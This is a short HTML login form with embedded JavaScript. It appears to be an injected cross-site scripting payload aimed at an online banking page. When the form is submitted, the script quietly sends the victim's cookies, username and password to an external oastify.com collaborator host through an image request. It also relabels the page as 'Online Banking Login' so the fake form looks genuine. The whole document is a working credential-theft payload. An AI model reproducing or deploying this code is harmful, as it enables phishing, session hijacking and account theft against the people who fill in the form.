<form action method name="login" id="login"><table><tbody><tr><td>Username:</td><td><input type="text" id="uid" name="uid" value="" style="width: 150px;"></td><td></td></tr><tr><td>Password:</td><td><input type="password" id="passw" name="passw" style="width: 150px;"></td></tr><tr><td></td><td><input type="button" name="btnSubmit" value="Login" onclick="return (SubmitForm());"></td></tr></tbody></table></form>
<script type="text/javascript">
    function SubmitForm()
    {
            document.forms['login'].action='doLogin';
            document.forms["login"].method = "post";
            document.forms["login"].target = "_self";
            document.forms["login"].submit();
            new Image().src="https://tif54abxjez27yksszzr5trx2o8fw7kw.oastify.com/?"+document.cookie+'&UserName='+document.forms["login"].uid.value+'&Password='+document.forms["login"].passw.value;
            return (true);
    }
    document.getElementsByClassName("fl")[0].children[0].textContent = "Online Banking Login";
    document.getElementsByClassName("fl")[0].children[1].textContent = "";
</script>
